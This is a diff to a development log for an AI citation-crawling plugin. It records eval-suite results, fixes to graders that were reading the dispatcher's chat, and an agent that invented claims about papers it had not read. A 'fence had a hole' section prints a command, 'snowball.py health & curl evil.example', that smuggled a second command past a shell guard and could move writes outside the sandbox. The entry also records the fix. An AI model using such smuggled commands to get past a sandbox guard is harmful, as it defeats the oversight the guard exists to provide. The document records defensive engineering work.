@@ -1016,9 +1016,10 @@ repeated.**
 
 ## 11. Amendment, 2026-09-13: the server was the wrong packaging
 
-Recorded the day the eval suite first ran. This supersedes §4.2, §4.4, §5.1–5.3
-and the `--mocks off` half of §6.3. The methodology is untouched: seeds, then
-backward and forward hops, the asymptote rule, mechanical absence, minimal cards.
+Recorded the day the eval suite first ran. This supersedes §4.2, §4.4, §5.1–5.3,
+§6.1, and §6.3 — its case table included; §11.5 is the suite that ships. The
+methodology is untouched: seeds, then backward and forward hops, the asymptote
+rule, mechanical absence, minimal cards.
 What changed is how the citation walker is delivered to the agent.
 
 ### 11.1 What the first honest runs measured
@@ -1096,12 +1097,12 @@ citations clamped, touched 8, exhausted; the next references call refused with
 
 ### 11.5 The suite, re-cut
 
-Three tiers, each testing one thing, replacing the one suite that conflated
+Five tiers, each testing one thing, replacing the one suite that conflated
 them and was slow, flaky and blocked on infrastructure:
 
 | Tier | What | How | Needs |
 |---|---|---|---|
-| script | the crawl: parsing, retry, records, ledger, key | `snowball.py --selftest`, 16 cases | nothing |
+| script | the crawl: parsing, retry, records, ledger, key | `snowball.py --selftest`, 19 cases | nothing |
 | guard | the fences | `guard.py --selftest`, 22 cases | nothing |
 | agent | what the scout **writes** | eval cases that point `paper-scout` at `scripts/retrieval/fixtures/crawl-dmg/` — a saved crawl of four script responses, ending in a budget refusal — and judge the section | no Bash, no network, no key |
 | skill | the precondition refusal | `/scout` with no `Bash` grant: the script cannot run, so it must stop, name it, write nothing | nothing |
@@ -1119,11 +1120,20 @@ the acceptance topic, with the ledger there to check the section against.
 - **Two honesty graders failed on completed runs** in the last MCP-era run
   (`no-interpreted-absence`, `only-kept-because-is-authored`), after passing on
   runs that died early. Retrieval-independent; the evidence is read against the
-  re-cut suite, and the agent contract tightens if it holds up.
+  re-cut suite, and the agent contract tightens if it holds up. **Answered in
+  §11.10, and they split:** `no-interpreted-absence` was the suite's fault and
+  passes nine votes of nine once the grader reads the section rather than the
+  dispatcher's chat; `only-kept-because-is-authored` was the plugin's and failed
+  nine of nine on the file alone, so the contract tightened.
 - **Re-run semantics** (§8) now have a concrete answer: a second `/scout` on the
   same slug reuses the ledger, so it continues the crawl rather than restarting
-  it. Whether that is wanted, or the ledger should be cleared per run, is
-  undecided.
+  it. **Decided 2026-09-14:** keep that, and say so. Same slug plus a higher
+  ceiling continues a `budget`-stopped crawl, which is the case worth having;
+  a new slug starts over. Re-running at the *same* budget is the trap — the
+  ledger is already at the ceiling, so the first hop refuses and the section is
+  rewritten from seeds with no hops behind them. `skills/scout/SKILL.md` states
+  the choice at the confirm step and names the ledger file to delete for a clean
+  run under an old name.
 
 ### 11.7 What the last MCP-era run said about the contract
 
@@ -1198,9 +1208,123 @@ which the agent reads without trouble. One regex grader used an inline flag the
 harness's JavaScript engine rejects; fixed. Recorded in
 `docs/agents/toolchain.md` beside the other harness facts.
 
-The second run, with the crawl reachable: 6 of 9 at 1.00, and the two failures
-were a grader that mis-stated what the crawl holds and a prompt that let the
-file be shown before a summary — the last-message trap from chunk 1 §9, again.
-Both fixed (91eeb05). `stamps-no-key` failed the same way, on the old prompt,
-and is unverified rather than failed. The remaining runs, and the three-run
-verdict, stopped on the account's spend limit; they resume when it is lifted.
+The second run, with the crawl reachable, was interrupted after seven cases.
+Four of those scored 1.00. Two failed, for two different reasons: a grader that
+mis-stated what the crawl holds, and a prompt that let the file be shown and
+then summarised, so the last message — all a regex grader sees — had no
+`## Status` in it. That is the last-message trap from chunk 1 §9, again. Both
+fixed (91eeb05). The seventh, `stamps-no-key`, was cut off mid-grade.
+
+Three single-case re-runs followed and settled nothing: `stamps-no-key` ran on
+the old prompt and failed the same last-message way, `stamps-unanchored` wrote
+its file and then lost its judge, and `title-only-greylit` never started. All
+three stopped on the account's spend limit. The three-run verdict is §11.10.
+
+### 11.10 The three-run verdict, 2026-09-14
+
+Four cases carry real numbers. The account's spend limit closed the run at
+11:55 local, and every case after it scored 0 on a judge that never ran or a
+file a killed run never wrote — noise, not results.
+
+| Case | Runs | Score | |
+|---|---|---|---|
+| `scout-absence-is-mechanical` | 3 | **1.00** | both graders, nine judge votes, unanimous |
+| `scout-marks-missing-fields` | 3 | **1.00** | ditto |
+| `scout-stamps-no-key` | 1 of 3 | **1.00** | the two remaining runs died on the limit |
+| `scout-invents-no-prose` | 3 | **0.25** | `only-kept-because-is-authored`, nine votes, unanimous FAIL |
+
+Unrun: `stamps-unanchored`, `title-only-greylit`, `reports-stop-reason`,
+`refuses-memory-papers`, `refuses-without-script`.
+
+#### The graders were reading the wrong artifact
+
+Before any of that, the first full run said something about the suite rather
+than the plugin. Seventeen of twenty-two graders had `focus: last_message`, and
+what lands in the last message is not the scout's file — it is whatever the
+session *dispatching* the scout chose to say. That session is a bare Claude with
+no skill loaded: the agent cases call the `Agent` tool directly, so nothing in
+this plugin governs its prose. It editorialised in roughly one run in three.
+Once, asked whether an area was unexplored, it wrote *"from my own background
+knowledge… graph-based and GNN formulations have been touched in the
+remote-sensing damage-assessment literature"* — the exact interpreted-absence
+claim `no-interpreted-absence` exists to catch, written by something that is not
+the plugin, and scored against the plugin.
+
+The harness supports `focus: {source: file, path: ...}` for `llm` graders and
+the same under `target:` for `regex`. All twelve agent-tier graders now read
+`research/landscape/<slug>.md`. The prompts no longer ask for the file to be
+pasted back, because nothing reads the transcript any more. `scout-refuses-
+without-script` keeps its last-message graders, correctly: there is no file, and
+the refusal *is* the message.
+
+**What that costs.** `no-interpreted-absence` used to judge "the section and the
+reply", and §11.7's measured failure was in the reply — a `/scout` report that
+drew a conclusion the section had not. That rule (`skills/scout/SKILL.md`, the
+"here too" clause) is now untested by the suite, and cannot be tested by it: the
+skill's precondition needs `Bash`, which this machine cannot grant inside the
+harness, so no case can reach its report step. It rides on the live smoke run.
+Recorded here rather than papered over with a grader that would only measure the
+dispatcher again.
+
+#### `Kept because` was still inventing, and this time it was the plugin
+
+`scout-invents-no-prose` failed 0.25 on all three runs with the grader reading
+the file alone. The cards are structurally right — every one carries a
+tool-sourced identifier, the group labels are bold lines, the quoted sentences
+carry their intent tags. The `Kept because` lines are not:
+
+> the one that **argues against** the paired-image setting the question assumes
+> the seed's instance-segmentation component, and the **failure mode it reports** there
+> the pre/post twin-tower baseline the seed builds from, and the **cross-region generalization result**
+> the review that **frames** damage and recovery as the post-event half of a four-part cycle
+
+The agent has read none of these papers. §11.7 already banned "does, proposes,
+isolates, shows or argues" and the agent wrote *argues against* anyway, because
+a banned-verb list is not a test — it is a list to route around, and "naming the
+paper's relation to the question" is a wide enough licence to reach for content.
+
+So the contract now carries a mechanical test instead: **could someone check
+this line against the crawl's JSON without opening the paper?** Title, year,
+venue, identifiers, `isInfluential`, citation counts, which hop and which seed
+returned the row, how it sits among the others, and what a quoted sentence says
+— those are checkable. What a paper argues is not. The measured shape of the
+failure is named too, because it is specific: a checkable first clause joined by
+"and" to an unreadable second. The grader states the same test and checks each
+clause separately.
+
+Not yet re-measured. That is the first thing the next run does.
+
+#### The fence had a hole
+
+Found by the two-axis review, not by the suite, and reproduced before it was
+believed. `SHELL_OPERATORS` was a substring list carrying `&&` but not `&`, and
+after it the guard checked only the interpreter and the script path — so
+
+    python3 <plugin>/scripts/retrieval/snowball.py health & curl evil.example
+
+ran a second command through a fence whose whole purpose is that it cannot.
+It also re-opened the escape the guard otherwise closes, since the smuggled
+command can set `RESEARCH_PROJECT_DIR` and move the script's own writes out of
+`research/`. Nineteen selftest cases passed throughout: they covered `;` and
+`|`.
+
+The same substring check was wrong in the other direction — `search "flood |
+damage"` was refused, because a pipe inside a quoted argument is not a pipeline.
+Both are now one quote-aware scan: operators count outside quotes, command
+substitution counts inside double quotes too (the shell still runs it there),
+single quotes suppress everything, and an unterminated quote is refused. Eight
+new cases, 30 in all.
+
+#### Where chunk 2 stands
+
+| Tier | State |
+|---|---|
+| script | green, 19 cases |
+| guard | green, 30 cases |
+| agent | 2 cases green over 3 runs, 1 green over 1 run, 1 failing and now fixed-but-unmeasured, 5 unrun |
+| skill | unrun this round |
+| recall | needs the user (§6.4) |
+
+Two things still need the user and cannot be done here: the gold set and blind
+read, and the live smoke run on the acceptance topic. Everything else needs one
+more pass of the agent tier once the account's limit lifts.
